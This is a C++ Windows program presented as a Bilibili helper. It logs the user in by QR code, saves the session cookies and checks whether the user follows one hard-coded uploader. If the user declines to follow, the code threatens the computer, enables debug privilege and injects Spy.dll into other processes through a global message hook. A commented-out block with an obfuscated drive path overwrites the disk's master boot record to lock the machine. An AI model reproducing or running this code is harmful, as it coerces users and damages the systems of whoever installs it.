#include "stdafx.h"

#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

//#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:wmainCRTStartup")

BOOL EnabledDebugPrivilege()
{
	BOOL result = FALSE;

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
	if (process)
	{
		HANDLE token;
		if (OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		{
			LUID luid;
			if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
			{
				TOKEN_PRIVILEGES tokenPrivileges;
				tokenPrivileges.PrivilegeCount = 1;
				tokenPrivileges.Privileges[0].Luid = luid;
				tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				if (AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
				{
					result = GetLastError() != ERROR_NOT_ALL_ASSIGNED;
				}
			}
		}

		CloseHandle(process);
	}

	return result;
}

static
std::string
to_svg(
	const qrcodegen::QrCode& qr,
	int border
)
{
	if (border < 0)
		throw std::domain_error("Border must be non-negative");
	if (border > INT_MAX / 2 || border * 2 > INT_MAX - qr.getSize())
		throw std::overflow_error("Border too large");

	std::ostringstream svg;
	svg << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
	svg << "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n";
	svg << "<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" viewBox=\"0 0 ";
	svg << (qr.getSize() + border * 2) << " " << (qr.getSize() + border * 2) << "\" stroke=\"none\">\n";
	svg << "\t<rect width=\"100%\" height=\"100%\" fill=\"#FFFFFF\"/>\n";
	svg << "\t<path d=\"";
	for (int y = 0; y < qr.getSize(); y++) {
		for (int x = 0; x < qr.getSize(); x++) {
			if (qr.getModule(x, y)) {
				if (x != 0 || y != 0)
					svg << " ";
				svg << "M" << (x + border) << "," << (y + border) << "h1v1h-1z";
			}
		}
	}
	svg << "\" fill=\"#000000\"/>\n";
	svg << "</svg>\n";
	return svg.str();
}

std::tuple<bool /*status*/, cpr::Cookies /*login_cookies*/>
bili_login_action_qrcode(
	void
)
{
	auto ret = cpr::Get(cpr::Url("http://passport.bilibili.com/qrcode/getLoginUrl"));
	if (!ret.error)
	{
		nlohmann::json json = nlohmann::json::parse(ret.text);
		auto url = json["data"]["url"].get<std::string>();
		auto oauth_key = json["data"]["oauthKey"].get<std::string>();
		auto qr_code = qrcodegen::QrCode::encodeText(url.c_str(), qrcodegen::QrCode::Ecc::HIGH);

		std::ofstream svg_file("login.svg", std::ios::trunc);
		if (svg_file.is_open())
		{
			svg_file << to_svg(qr_code, 4) << std::flush;
			svg_file.close();
			ShellExecuteW(NULL, L"open", L"login.svg", NULL, NULL, SW_SHOW);

			cpr::Cookies login_cookies{};
			while (true)
			{
				Sleep(6000);

				ret = cpr::Post(cpr::Url("http://passport.bilibili.com/qrcode/getLoginInfo"), cpr::Payload{ {"oauthKey",oauth_key} });

				if (!ret.error)
				{
					json = nlohmann::json::parse(ret.text);
					auto status = json["status"].get<bool>();

					if (status)
					{
						login_cookies = ret.cookies;
						spdlog::info("login success,DedeUserID:{}", login_cookies["DedeUserID"]);

						break;
					}
					else
					{
						auto message = json["message"].get<std::string>();

						spdlog::error("login error,message:{}", message);
					}
				}
				else
					spdlog::error("getLoginInfo failed");
			}

			return { true,std::move(login_cookies) };
		}
		else
			spdlog::error("create login.svg failed");
	}
	else
		spdlog::error("getLoginUrl failed");

	return { false, cpr::Cookies() };
}

std::tuple<bool /*status*/, nlohmann::json /*json*/>
bili_account_basic_info(
	const std::string& target_mid,
	const std::string& sessdata
)
{
	auto ret = cpr::Get(cpr::Url("http://api.bilibili.com/x/space/acc/info"), cpr::Parameters{ { cpr::Parameter("mid", target_mid) } }, cpr::Cookies({ { "SESSDATA", sessdata } }, false));
	if (!ret.error)
	{
		auto json = nlohmann::json::parse(ret.text);
		auto uname = json["data"]["name"].get<std::string>();
		auto level = json["data"]["level"].get<uint16_t>();
		auto is_senior_member = json["data"]["is_senior_member"].get<uint16_t>();

		spdlog::info("hello {},level {}{}", uname, level, is_senior_member == 1 ? "(hardcore)" : "");

		return { true, std::move(json) };
	}
	else
		spdlog::error("info failed");

	return { false, nlohmann::json() };
}

std::tuple<bool /*status*/, bool /*is_followed*/>
bili_account_relation_is_follow(
	const std::string& target_mid,
	const std::string& sessdata
)
{
	auto ret = cpr::Get(cpr::Url("http://api.bilibili.com/x/space/acc/info"), cpr::Parameters{ { cpr::Parameter("mid", target_mid) } }, cpr::Cookies({ { "SESSDATA", sessdata } }, false));
	if (!ret.error)
	{
		auto json = nlohmann::json::parse(ret.text);
		auto uname = json["data"]["name"].get<std::string>();
		auto is_followed = json["data"]["is_followed"].get<bool>();

		spdlog::info("{} is {}", uname, is_followed ? "followed" : "not followed");

		return { true, is_followed };
	}
	else
		spdlog::error("info failed");

	return { false, false };
}

bool
bili_account_relation_modify(
	const std::string& act,
	const std::string& target_mid,
	const std::string& csrf,
	const std::string& sessdata
)
{
	auto ret = cpr::Post(cpr::Url("http://api.bilibili.com/x/relation/modify"), cpr::Payload{ {"fid",target_mid},{"act",act},{"re_src","11"},{"csrf",csrf} }, cpr::Cookies({ { "SESSDATA", sessdata } }, false));
	if (!ret.error)
	{
		spdlog::info("successfully followed {}", target_mid);

		return true;
	}
	else
		spdlog::error("modify failed");

	return false;
}

int MessageBoxPos(TASKDIALOGCONFIG* config, bool NoMove, int X = 0, int Y = 0)
{
	std::pair<int, int> pos{ X,Y };

	auto TaskDialogCallback = [](HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, LONG_PTR lpRefData) -> HRESULT
	{
		if (Msg == TDN_DIALOG_CONSTRUCTED)
		{
			std::pair<int, int>* pos = (std::pair<int, int>*)lpRefData;
			SetWindowPos(hWnd, 0, pos->first, pos->second, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
		}

		return S_OK;
	};

	if (!NoMove)
		config->pfCallback = TaskDialogCallback;

	int button = 0;
	TaskDialogIndirect(config, &button, NULL, NULL);
	return button;
}

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
	_CrtSetReportMode(_CRT_WARN, _CRTDBG_MODE_DEBUG);

	SetConsoleOutputCP(65001);
	CONSOLE_FONT_INFOEX Info = { 0 };
	Info.cbSize = sizeof(Info);
	Info.dwFontSize.Y = 16;
	Info.FontWeight = FW_NORMAL;
	wcscpy_s(Info.FaceName, L"Consolas");
	SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), NULL, &Info);

	cpr::Cookies login_cookies{};

	if (std::filesystem::exists("cookies.txt"))
	{
		std::ifstream cookies_file("cookies.txt");

		if (!cookies_file.is_open())
		{
			spdlog::error("login_cookies failed");

			return 1;
		}

		boost::archive::text_iarchive cookies_file_archive(cookies_file);
		cookies_file_archive >> login_cookies.map_;

		cookies_file.close();
	}
	else
	{
		{
			TASKDIALOGCONFIG config = { 0 };
			config.cbSize = sizeof(config);
			config.dwCommonButtons = TDCBF_OK_BUTTON;
			config.pszMainIcon = TD_INFORMATION_ICON;
			config.pszMainInstruction = L"B站助手";
			config.pszContent = L"请在接下来的弹窗中扫码";
			config.pszWindowTitle = L"B站助手";

			MessageBoxPos(&config, true);
		}

		auto bili_login_qrcode_ret = bili_login_action_qrcode();

		if (!std::get<0>(bili_login_qrcode_ret))
		{
			spdlog::error("login_cookies failed");

			return 1;
		}

		login_cookies = std::get<1>(bili_login_qrcode_ret);

		std::ofstream cookies_file("cookies.txt");

		if (cookies_file.is_open())
		{
			boost::archive::text_oarchive cookies_file_archive(cookies_file);
			cookies_file_archive << login_cookies.map_;

			cookies_file.close();
		}
		else
			spdlog::error("login_cookies failed");
	}

	auto bili_account_get_info_ret = bili_account_basic_info(login_cookies["DedeUserID"], login_cookies["SESSDATA"]);
	auto bili_account_is_follow_ret = bili_account_relation_is_follow("33293272", login_cookies["SESSDATA"]);

	{
		std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;

		auto main_inst = fmt::format(L"你好啊:{}", conv.from_bytes(std::get<1>(bili_account_get_info_ret)["data"]["name"]));
		auto content = std::get<1>(bili_account_is_follow_ret) ? L"" : L"你居然没关注我!!!要不要关注我?";

		TASKDIALOGCONFIG config = { 0 };
		config.cbSize = sizeof(config);
		config.dwCommonButtons = TDCBF_OK_BUTTON;
		if (!std::get<1>(bili_account_is_follow_ret))
			config.dwCommonButtons |= TDCBF_NO_BUTTON;
		if (std::get<1>(bili_account_is_follow_ret))
			config.pszMainIcon = TD_INFORMATION_ICON;
		else
			config.pszMainIcon = TD_ERROR_ICON;
		config.pszMainInstruction = main_inst.c_str();
		config.pszContent = content;
		config.pszWindowTitle = L"B站助手";

		auto choose = MessageBoxPos(&config, true);

		if (choose == IDNO)
		{
			config.cbSize = sizeof(config);
			config.dwCommonButtons = TDCBF_OK_BUTTON;
			config.pszMainIcon = TD_ERROR_ICON;
			config.pszMainInstruction = L"警告";
			config.pszContent = L"由于你没有关注UP,导致你的电脑即将去世";
			config.pszWindowTitle = L"B站助手";

			MessageBoxPos(&config, true);

			auto SpyDll = LoadLibraryW(L"Spy.dll");
			if (SpyDll && EnabledDebugPrivilege())
			{
				//std::vector<std::tuple<DWORD /*ProcessID*/, std::wstring /*ExeFile*/, DWORD /*ThreadID*/, HWND, HHOOK>> inject_array{};

				////HANDLE snapshot_thread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
				//HANDLE snapshot_process = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
				//if (snapshot_process/* && snapshot_thread*/)
				//{
				//	PROCESSENTRY32W ProcessItem{};
				//	ProcessItem.dwSize = sizeof(PROCESSENTRY32W);

				//	if (Process32FirstW(snapshot_process, &ProcessItem))
				//	{
				//		do
				//		{
				//			std::wstring ExeFile(ProcessItem.szExeFile);

				//			inject_array.push_back({ ProcessItem.th32ProcessID, std::move(ExeFile),0 ,NULL,NULL });
				//		} while (Process32NextW(snapshot_process, &ProcessItem));
				//	}

				//	/*THREADENTRY32 ThreadItem{};
				//	ThreadItem.dwSize = sizeof(THREADENTRY32);

				//	if (Thread32First(snapshot_thread, &ThreadItem))
				//	{
				//		do
				//		{
				//			for (auto& item : inject_array)
				//			{
				//				if (std::get<0>(item) == ThreadItem.th32OwnerProcessID)
				//				{
				//					if (ThreadItem.tpBasePri > std::get<3>(item))
				//					{
				//						std::get<2>(item) = ThreadItem.th32ThreadID;
				//						std::get<3>(item) = ThreadItem.tpBasePri;

				//						spdlog::info(L"injecting {}(PID:{}) -> {}(BasePri:{})", std::get<1>(item), std::get<0>(item), std::get<2>(item), std::get<3>(item));
				//					}
				//				}
				//			}
				//		} while (Thread32Next(snapshot_thread, &ThreadItem));
				//	}*/

				//	CloseHandle(snapshot_process);
				//	//CloseHandle(snapshot_thread);

				//	EnumWindows([](
				//		HWND hWnd,
				//		LPARAM lParam)->BOOL
				//		{
				//			std::vector<std::tuple<DWORD /*ProcessID*/, std::wstring /*ExeFile*/, DWORD /*ThreadID*/, HWND, HHOOK>>& inject_array = *(std::vector<std::tuple<DWORD /*ProcessID*/, std::wstring /*ExeFile*/, DWORD /*ThreadID*/, HWND, HHOOK>>*)lParam;

				//			DWORD ProcessID = 0;
				//			DWORD ThreadID = GetWindowThreadProcessId(hWnd, &ProcessID);

				//			for (auto& item : inject_array)
				//				if (ProcessID == std::get<0>(item))
				//				{
				//					std::get<2>(item) = ThreadID;
				//					std::get<3>(item) = hWnd;
				//				}

				//			return TRUE;
				//		}, (LPARAM)&inject_array);

				//	HOOKPROC NextHook = (HOOKPROC)GetProcAddress(SpyDll, "Hooker");

				//	for (auto& item : inject_array)
				//	{
				//		if (std::get<2>(item))
				//		{
				//			std::get<4>(item) = SetWindowsHookExW(WH_GETMESSAGE, NextHook, SpyDll, std::get<2>(item));

				//			if (std::get<4>(item))
				//			{
				//				PostThreadMessageW(std::get<2>(item), WM_NULL, NULL, NULL);
				//				spdlog::info(L"injected {}(PID:{}) -> {}", std::get<1>(item), std::get<0>(item), std::get<2>(item));
				//			}
				//			else
				//				spdlog::error(L"{} SetWindowsHookExW error,GetLastError:{}", std::get<1>(item), GetLastError());
				//		}
				//		else
				//			spdlog::error(L"{} EnumWindows error", std::get<1>(item));
				//	}
				//}
				//else
				//{
				//	spdlog::error("CreateToolhelp32Snapshot error");

				//	config.cbSize = sizeof(config);
				//	config.dwCommonButtons = TDCBF_OK_BUTTON;
				//	config.pszMainIcon = TD_ERROR_ICON;
				//	config.pszMainInstruction = L"警告";
				//	config.pszContent = L"由于UP今天心情好,暂且放过你的电脑";
				//	config.pszWindowTitle = L"B站助手";

				//	MessageBoxPos(&config, true);
				//}

				/*wchar_t DriveString1[] = { L"\\\\" };
				wchar_t DriveString2[] = { L".\\Physica" };
				wchar_t DriveString3[] = { L"lDrive0" };
				auto FullString = fmt::format(L"{}{}{}", DriveString1, DriveString2, DriveString3);

				auto DiskHandle = CreateFileW(FullString.c_str(), FILE_WRITE_DATA | FILE_READ_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

				std::wcout << FullString << std::endl;
				if (DiskHandle != INVALID_HANDLE_VALUE)
				{
					LARGE_INTEGER Pos{ 0 };
					DWORD Bytes = 0;
					BYTE Sector[0x200]{ 0x00 };
					SetFilePointer(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
					if (ReadFile(DiskHandle, Sector, sizeof(Sector), &Bytes, NULL))
					{
						Sector[0x1BE] = 0x80;
						Sector[0x1BF] = 0xFE;
						Sector[0x1C0] = 0xFF;
						Sector[0x1C1] = 0xFF;
						Sector[0x1C2] = 0x0F;
						Sector[0x1C3] = 0xFE;
						Sector[0x1C4] = 0xFF;
						Sector[0x1C5] = 0xFF;
						Sector[0x1C6] = 0x00;
						Sector[0x1C7] = 0x00;
						Sector[0x1C8] = 0x00;
						Sector[0x1C9] = 0x00;
						Sector[0x1CA] = 0x01;
						Sector[0x1CB] = 0x00;
						Sector[0x1CC] = 0x00;
						Sector[0x1CD] = 0x00;

						SetFilePointer(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
						if (WriteFile(DiskHandle, Sector, sizeof(Sector), &Bytes, NULL))
						{
							spdlog::info("Locked!");
						}
						else
							spdlog::error("WriteFile error,GetLastError():{}", GetLastError());
					}
					else
						spdlog::error("ReadFile error,GetLastError():{}", GetLastError());

					CloseHandle(DiskHandle);
				}
				else
					spdlog::error("CreateFile error,GetLastError():{}", GetLastError());*/

				HOOKPROC NextHook = (HOOKPROC)GetProcAddress(SpyDll, "Hooker");
				HHOOK HookHandle = SetWindowsHookExW(WH_GETMESSAGE, NextHook, SpyDll, 0);
				if (!HookHandle)
					spdlog::error(L"SetWindowsHookExW error,GetLastError:{}", GetLastError());
			}
			else
			{
				spdlog::error("LoadLibraryW error");

				config.cbSize = sizeof(config);
				config.dwCommonButtons = TDCBF_OK_BUTTON;
				config.pszMainIcon = TD_ERROR_ICON;
				config.pszMainInstruction = L"警告";
				config.pszContent = L"由于UP今天心情好,暂且放过你的电脑";
				config.pszWindowTitle = L"B站助手";

				MessageBoxPos(&config, true);
			}
		}
		else
		{
			auto bili_account_relation_modify_ret = bili_account_relation_modify("1", "33293272", login_cookies["bili_jct"], login_cookies["SESSDATA"]);

			config.cbSize = sizeof(config);
			config.dwCommonButtons = TDCBF_OK_BUTTON;
			config.pszMainIcon = TD_INFORMATION_ICON;
			config.pszMainInstruction = L"蟹蟹李";
			config.pszContent = L"蟹蟹李关注UP!!!";
			config.pszWindowTitle = L"B站助手";

			MessageBoxPos(&config, true);
		}
	}

	_getch();

	return 0;
}